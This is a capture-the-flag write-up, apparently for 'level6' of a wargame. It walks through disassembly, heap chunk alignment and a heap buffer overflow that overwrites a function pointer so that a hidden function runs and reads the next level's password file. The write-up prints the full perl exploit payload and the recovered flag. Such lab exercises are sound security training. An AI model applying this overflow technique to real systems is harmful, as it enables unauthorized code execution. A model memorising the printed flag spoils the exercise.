# level6

```bash
> objdump -d level6
...
08048454 <n>:
 8048454:	55                   	push   %ebp
 8048455:	89 e5                	mov    %esp,%ebp
 8048457:	83 ec 18             	sub    $0x18,%esp
 804845a:	c7 04 24 b0 85 04 08 	movl   $0x80485b0,(%esp)
 8048461:	e8 0a ff ff ff       	call   8048370 <system@plt>
 8048466:	c9                   	leave
 8048467:	c3                   	ret
...
```
```c
void	n() {
	system("/bin/cat /home/user/level7/.pass");
	return;
}
```
> view the `Ressources/main.asm` and `source` files for the disasembly part

Interesting we can see a function `n` that is never called, let's try to call it.

---

```
> ./level6 AAA
Nope
> ./level6 `perl -e 'print "A"x64'`
Nope
> ./level6 `perl -e 'print "A"x80'`
Segmentation fault (core dumped)
```

If we disass the executable, we can see that we have 2 malloc call. (64 bytes & 4 bytes).

The first malloc is filled at the end of the program in a strcpy (it take the value of argv[1]).

The second malloc is a pointer on the function `m`. It is called at the end of the program (after the strcpy).

---

The goal is to replace the ptr by a ptr on the function `n`. To do this, we have to overflow argv[1].

```c
char *str = malloc(64);  // if addr is 0
void *fPtr = malloc(4);   // then addr is 0 + 64(size) + 8(offset)

fPtr = &m;  // fPtr point on function m, we want to modify this value

strcpy(str, argv[i]); // copy arg to str

(*fPtr)();  // call the function pointed by fPtr (m)
```

if we overflow the first malloc we can achieve to change the fPtr value

malloc:
```
"...
The first (4-byte) field of each chunk give its size, and since the size is guaranteed to be divisible by 8.
...
when the user asks for size n, the chunk size will be not less than the smallest multiple of eight above n+4.
..."
```
> https://www.win.tue.nl/~aeb/linux/hh/hh-11.html

Let's calculate malloc offset

- (4 + alignmentOffset) = 0
- ~~(4 + 0) % 8 = 4~~
- (4 + 4) % 8 = 0

---

Exploit

64bytes (str value) - 8bytes (offset btw 2 malloc) - 4bytes (fPtr value) - ...

```
# in this example, A is used to fill the str, B to fill the offset and then we can change ptr
> ./level6 `perl -e 'print "A"x64 . "B"x8 . "\x54\x84\x04\x08"'`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```